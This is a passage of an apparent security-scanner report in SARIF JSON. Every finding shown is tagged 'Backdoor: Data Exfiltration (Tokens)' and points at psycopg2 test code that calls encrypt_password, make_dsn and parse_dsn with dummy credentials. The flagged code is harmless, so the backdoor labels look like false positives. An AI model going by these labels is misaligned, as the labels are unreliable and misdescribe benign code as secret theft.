                      "markdown": "`            )[:14], 'SCRAM-SHA-256$')\n\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    def test_encrypt_md5(self):\n        self.assertEqual(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1534,
                  "startColumn": 24,
                  "endLine": 1534,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n        self.assertEqual(\n            ext.encrypt_password(\n                'psycopg2', 'ashesh', self.conn, 'scram-sha-256'\n            )[:14], 'SCRAM-SHA-256$')\n\n",
                    "rendered": {
                      "text": "            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n        self.assertEqual(\n            ext.encrypt_password(\n                'psycopg2', 'ashesh', self.conn, 'scram-sha-256'\n            )[:14], 'SCRAM-SHA-256$')\n\n",
                      "markdown": "`            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n        self.assertEqual(\n            ext.encrypt_password(\n                'psycopg2', 'ashesh', self.conn, 'scram-sha-256'\n            )[:14], 'SCRAM-SHA-256$')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1531,
                  "startColumn": 33,
                  "endLine": 1531,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            self.assertEqual(\n                enc_password, 'md594839d658c28a357126f105b9cb14cfc')\n        elif server_encryption_algorithm == 'scram-sha-256':\n            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n        self.assertEqual(\n            ext.encrypt_password(\n",
                    "rendered": {
                      "text": "            self.assertEqual(\n                enc_password, 'md594839d658c28a357126f105b9cb14cfc')\n        elif server_encryption_algorithm == 'scram-sha-256':\n            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n        self.assertEqual(\n            ext.encrypt_password(\n",
                      "markdown": "`            self.assertEqual(\n                enc_password, 'md594839d658c28a357126f105b9cb14cfc')\n        elif server_encryption_algorithm == 'scram-sha-256':\n            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n        self.assertEqual(\n            ext.encrypt_password(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1529,
                  "startColumn": 20,
                  "endLine": 1529,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n        if server_encryption_algorithm == 'md5':\n            self.assertEqual(\n                enc_password, 'md594839d658c28a357126f105b9cb14cfc')\n        elif server_encryption_algorithm == 'scram-sha-256':\n            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n",
                    "rendered": {
                      "text": "\n        if server_encryption_algorithm == 'md5':\n            self.assertEqual(\n                enc_password, 'md594839d658c28a357126f105b9cb14cfc')\n        elif server_encryption_algorithm == 'scram-sha-256':\n            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n",
                      "markdown": "`\n        if server_encryption_algorithm == 'md5':\n            self.assertEqual(\n                enc_password, 'md594839d658c28a357126f105b9cb14cfc')\n        elif server_encryption_algorithm == 'scram-sha-256':\n            self.assertEqual(enc_password[:14], 'SCRAM-SHA-256$')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1524,
                  "startColumn": 35,
                  "endLine": 1524,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n            'psycopg2', 'ashesh', self.conn)\n\n        if server_encryption_algorithm == 'md5':\n",
                    "rendered": {
                      "text": "        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n            'psycopg2', 'ashesh', self.conn)\n\n        if server_encryption_algorithm == 'md5':\n",
                      "markdown": "`        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n            'psycopg2', 'ashesh', self.conn)\n\n        if server_encryption_algorithm == 'md5':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1524,
                  "startColumn": 12,
                  "endLine": 1524,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n            'psycopg2', 'ashesh', self.conn)\n\n        if server_encryption_algorithm == 'md5':\n",
                    "rendered": {
                      "text": "        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n            'psycopg2', 'ashesh', self.conn)\n\n        if server_encryption_algorithm == 'md5':\n",
                      "markdown": "`        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n            'psycopg2', 'ashesh', self.conn)\n\n        if server_encryption_algorithm == 'md5':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1521,
                  "startColumn": 26,
                  "endLine": 1521,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    @skip_before_postgres(10)\n    def test_encrypt_server(self):\n        cur = self.conn.cursor()\n        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n",
                    "rendered": {
                      "text": "    @skip_before_postgres(10)\n    def test_encrypt_server(self):\n        cur = self.conn.cursor()\n        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n",
                      "markdown": "`    @skip_before_postgres(10)\n    def test_encrypt_server(self):\n        cur = self.conn.cursor()\n        cur.execute(\"SHOW password_encryption;\")\n        server_encryption_algorithm = cur.fetchone()[0]\n\n        enc_password = ext.encrypt_password(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1516,
                  "startColumn": 19,
                  "endLine": 1516,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n    @skip_if_crdb(\"password_encryption\")\n    @skip_before_libpq(10)\n    @skip_before_postgres(10)\n    def test_encrypt_server(self):\n",
                    "rendered": {
                      "text": "                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n    @skip_if_crdb(\"password_encryption\")\n    @skip_before_libpq(10)\n    @skip_before_postgres(10)\n    def test_encrypt_server(self):\n",
                      "markdown": "`                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n    @skip_if_crdb(\"password_encryption\")\n    @skip_before_libpq(10)\n    @skip_before_postgres(10)\n    def test_encrypt_server(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1512,
                  "startColumn": 16,
                  "endLine": 1512,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        # keywords\n        self.assertEqual(\n            ext.encrypt_password(\n                password='psycopg2', user='ashesh',\n                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n",
                    "rendered": {
                      "text": "        # keywords\n        self.assertEqual(\n            ext.encrypt_password(\n                password='psycopg2', user='ashesh',\n                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n",
                      "markdown": "`        # keywords\n        self.assertEqual(\n            ext.encrypt_password(\n                password='psycopg2', user='ashesh',\n                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1511,
                  "startColumn": 24,
                  "endLine": 1511,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n        # keywords\n        self.assertEqual(\n            ext.encrypt_password(\n                password='psycopg2', user='ashesh',\n                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n",
                    "rendered": {
                      "text": "\n        # keywords\n        self.assertEqual(\n            ext.encrypt_password(\n                password='psycopg2', user='ashesh',\n                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n",
                      "markdown": "`\n        # keywords\n        self.assertEqual(\n            ext.encrypt_password(\n                password='psycopg2', user='ashesh',\n                scope=self.conn, algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1506,
                  "startColumn": 24,
                  "endLine": 1506,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', self.conn, 'md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n        # keywords\n",
                    "rendered": {
                      "text": "    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', self.conn, 'md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n        # keywords\n",
                      "markdown": "`    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', self.conn, 'md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n        # keywords\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1503,
                  "startColumn": 21,
                  "endLine": 1503,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\nclass TestEncryptPassword(ConnectingTestCase):\n    @skip_before_postgres(10)\n    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', self.conn, 'md5'),\n",
                    "rendered": {
                      "text": "\nclass TestEncryptPassword(ConnectingTestCase):\n    @skip_before_postgres(10)\n    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', self.conn, 'md5'),\n",
                      "markdown": "`\nclass TestEncryptPassword(ConnectingTestCase):\n    @skip_before_postgres(10)\n    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', self.conn, 'md5'),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1501,
                  "startColumn": 17,
                  "endLine": 1501,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        self.assertEqual(cur.fetchone()[0], 'on')\n\n\nclass TestEncryptPassword(ConnectingTestCase):\n    @skip_before_postgres(10)\n    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n",
                    "rendered": {
                      "text": "        self.assertEqual(cur.fetchone()[0], 'on')\n\n\nclass TestEncryptPassword(ConnectingTestCase):\n    @skip_before_postgres(10)\n    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n",
                      "markdown": "`        self.assertEqual(cur.fetchone()[0], 'on')\n\n\nclass TestEncryptPassword(ConnectingTestCase):\n    @skip_before_postgres(10)\n    def test_encrypt_password_post_9_6(self):\n        # MD5 algorithm\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 562,
                  "startColumn": 22,
                  "endLine": 562,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        conn = self.connect()\n        d = conn.get_dsn_parameters()\n        self.assertEqual(d['dbname'], dbname)  # the only param we can check reliably\n        self.assert_('password' not in d, d)\n\n\nclass IsolationLevelsTestCase(ConnectingTestCase):\n",
                    "rendered": {
                      "text": "        conn = self.connect()\n        d = conn.get_dsn_parameters()\n        self.assertEqual(d['dbname'], dbname)  # the only param we can check reliably\n        self.assert_('password' not in d, d)\n\n\nclass IsolationLevelsTestCase(ConnectingTestCase):\n",
                      "markdown": "`        conn = self.connect()\n        d = conn.get_dsn_parameters()\n        self.assertEqual(d['dbname'], dbname)  # the only param we can check reliably\n        self.assert_('password' not in d, d)\n\n\nclass IsolationLevelsTestCase(ConnectingTestCase):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 550,
                  "startColumn": 37,
                  "endLine": 550,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n        dsn = ext.make_dsn(url, application_name='woot')\n        self.assertDsnEqual(dsn,\n            'dbname=test user=tester password=secret application_name=woot')\n\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.make_dsn, 'postgresql://tester:secret@/test?nosuch=param')\n",
                    "rendered": {
                      "text": "\n        dsn = ext.make_dsn(url, application_name='woot')\n        self.assertDsnEqual(dsn,\n            'dbname=test user=tester password=secret application_name=woot')\n\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.make_dsn, 'postgresql://tester:secret@/test?nosuch=param')\n",
                      "markdown": "`\n        dsn = ext.make_dsn(url, application_name='woot')\n        self.assertDsnEqual(dsn,\n            'dbname=test user=tester password=secret application_name=woot')\n\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.make_dsn, 'postgresql://tester:secret@/test?nosuch=param')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 539,
                  "startColumn": 53,
                  "endLine": 539,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        self.assertEqual(dsn, dsnin)\n\n    def test_null_args(self):\n        dsn = ext.make_dsn(\"dbname=foo\", user=\"bar\", password=None)\n        self.assertDsnEqual(dsn, \"dbname=foo user=bar\")\n\n    @skip_before_libpq(9, 2)\n",
                    "rendered": {
                      "text": "        self.assertEqual(dsn, dsnin)\n\n    def test_null_args(self):\n        dsn = ext.make_dsn(\"dbname=foo\", user=\"bar\", password=None)\n        self.assertDsnEqual(dsn, \"dbname=foo user=bar\")\n\n    @skip_before_libpq(9, 2)\n",
                      "markdown": "`        self.assertEqual(dsn, dsnin)\n\n    def test_null_args(self):\n        dsn = ext.make_dsn(\"dbname=foo\", user=\"bar\", password=None)\n        self.assertDsnEqual(dsn, \"dbname=foo user=bar\")\n\n    @skip_before_libpq(9, 2)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 534,
                  "startColumn": 40,
                  "endLine": 534,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        self.assertDsnEqual(dsn, 'dbname=foo user=postgres')\n\n    def test_no_dsn_munging(self):\n        dsnin = 'dbname=a host=b user=c password=d'\n        dsn = ext.make_dsn(dsnin)\n        self.assertEqual(dsn, dsnin)\n\n",
                    "rendered": {
                      "text": "        self.assertDsnEqual(dsn, 'dbname=foo user=postgres')\n\n    def test_no_dsn_munging(self):\n        dsnin = 'dbname=a host=b user=c password=d'\n        dsn = ext.make_dsn(dsnin)\n        self.assertEqual(dsn, dsnin)\n\n",
                      "markdown": "`        self.assertDsnEqual(dsn, 'dbname=foo user=postgres')\n\n    def test_no_dsn_munging(self):\n        dsnin = 'dbname=a host=b user=c password=d'\n        dsn = ext.make_dsn(dsnin)\n        self.assertEqual(dsn, dsnin)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 505,
                  "startColumn": 46,
                  "endLine": 505,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n    def test_empty_param(self):\n        dsn = ext.make_dsn(dbname='sony', password='')\n        self.assertDsnEqual(dsn, \"dbname=sony password=''\")\n\n    def test_escape(self):\n        dsn = ext.make_dsn(dbname='hello world')\n",
                    "rendered": {
                      "text": "\n    def test_empty_param(self):\n        dsn = ext.make_dsn(dbname='sony', password='')\n        self.assertDsnEqual(dsn, \"dbname=sony password=''\")\n\n    def test_escape(self):\n        dsn = ext.make_dsn(dbname='hello world')\n",
                      "markdown": "`\n    def test_empty_param(self):\n        dsn = ext.make_dsn(dbname='sony', password='')\n        self.assertDsnEqual(dsn, \"dbname=sony password=''\")\n\n    def test_escape(self):\n        dsn = ext.make_dsn(dbname='hello world')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 504,
                  "startColumn": 42,
                  "endLine": 504,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            ext.make_dsn, 'dbname=a', nosuchparam='b')\n\n    def test_empty_param(self):\n        dsn = ext.make_dsn(dbname='sony', password='')\n        self.assertDsnEqual(dsn, \"dbname=sony password=''\")\n\n    def test_escape(self):\n",
                    "rendered": {
                      "text": "            ext.make_dsn, 'dbname=a', nosuchparam='b')\n\n    def test_empty_param(self):\n        dsn = ext.make_dsn(dbname='sony', password='')\n        self.assertDsnEqual(dsn, \"dbname=sony password=''\")\n\n    def test_escape(self):\n",
                      "markdown": "`            ext.make_dsn, 'dbname=a', nosuchparam='b')\n\n    def test_empty_param(self):\n        dsn = ext.make_dsn(dbname='sony', password='')\n        self.assertDsnEqual(dsn, \"dbname=sony password=''\")\n\n    def test_escape(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 452,
                  "startColumn": 45,
                  "endLine": 452,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    @skip_before_libpq(9, 2)\n    def test_parse_dsn_uri(self):\n        self.assertEqual(ext.parse_dsn('postgresql://tester:secret@/test'),\n                         dict(user='tester', password='secret', dbname='test'),\n                         \"valid URI dsn parsed\")\n\n        raised = False\n",
                    "rendered": {
                      "text": "    @skip_before_libpq(9, 2)\n    def test_parse_dsn_uri(self):\n        self.assertEqual(ext.parse_dsn('postgresql://tester:secret@/test'),\n                         dict(user='tester', password='secret', dbname='test'),\n                         \"valid URI dsn parsed\")\n\n        raised = False\n",
                      "markdown": "`    @skip_before_libpq(9, 2)\n    def test_parse_dsn_uri(self):\n        self.assertEqual(ext.parse_dsn('postgresql://tester:secret@/test'),\n                         dict(user='tester', password='secret', dbname='test'),\n                         \"valid URI dsn parsed\")\n\n        raised = False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 54,
                  "endLine": 442,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        raised = False\n        try:\n            # unterminated quote after dbname:\n            ext.parse_dsn(\"dbname='test 2 user=tester password=secret\")\n        except psycopg2.ProgrammingError as e:\n            raised = True\n            self.assertTrue(str(e).find('secret') < 0,\n",
                    "rendered": {
                      "text": "        raised = False\n        try:\n            # unterminated quote after dbname:\n            ext.parse_dsn(\"dbname='test 2 user=tester password=secret\")\n        except psycopg2.ProgrammingError as e:\n            raised = True\n            self.assertTrue(str(e).find('secret') < 0,\n",
                      "markdown": "`        raised = False\n        try:\n            # unterminated quote after dbname:\n            ext.parse_dsn(\"dbname='test 2 user=tester password=secret\")\n        except psycopg2.ProgrammingError as e:\n            raised = True\n            self.assertTrue(str(e).find('secret') < 0,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 434,
                  "startColumn": 32,
                  "endLine": 434,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n            dict(user='tester', password='secret', dbname='test 2'),\n            \"DSN with quoting parsed\")\n\n        # Can't really use assertRaisesRegexp() here since we need to\n",
                    "rendered": {
                      "text": "\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n            dict(user='tester', password='secret', dbname='test 2'),\n            \"DSN with quoting parsed\")\n\n        # Can't really use assertRaisesRegexp() here since we need to\n",
                      "markdown": "`\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n            dict(user='tester', password='secret', dbname='test 2'),\n            \"DSN with quoting parsed\")\n\n        # Can't really use assertRaisesRegexp() here since we need to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 433,
                  "startColumn": 55,
                  "endLine": 433,
                  "endColumn": 63,
                  "snippet": {
                    "text": "                          \"dbname=test 2 user=tester password=secret\")\n\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n            dict(user='tester', password='secret', dbname='test 2'),\n            \"DSN with quoting parsed\")\n\n",
                    "rendered": {
                      "text": "                          \"dbname=test 2 user=tester password=secret\")\n\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n            dict(user='tester', password='secret', dbname='test 2'),\n            \"DSN with quoting parsed\")\n\n",
                      "markdown": "`                          \"dbname=test 2 user=tester password=secret\")\n\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n            dict(user='tester', password='secret', dbname='test 2'),\n            \"DSN with quoting parsed\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
